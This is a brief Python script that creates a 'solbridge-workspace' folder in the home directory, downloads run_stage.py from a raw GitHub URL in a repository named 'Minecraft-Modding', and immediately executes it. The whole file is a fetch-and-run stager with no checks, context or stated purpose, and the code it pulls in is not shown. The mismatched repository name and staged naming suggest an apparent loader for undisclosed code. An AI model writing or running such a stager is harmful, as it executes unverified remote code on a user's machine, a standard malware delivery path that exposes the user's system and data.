import subprocess
from pathlib import Path
p=Path.home()/"solbridge-workspace"/"appuid-installer"/"run_stage.py"
p.parent.mkdir(parents=True,exist_ok=True)
subprocess.run(["curl","-fsSL","https://raw.githubusercontent.com/keepinitkrispy/Minecraft-Modding/solbridge-v1/solbridge/appuid-installer/run_stage.py","-o",str(p)],check=True,timeout=60)
subprocess.run(["python",str(p)],check=True,timeout=300)
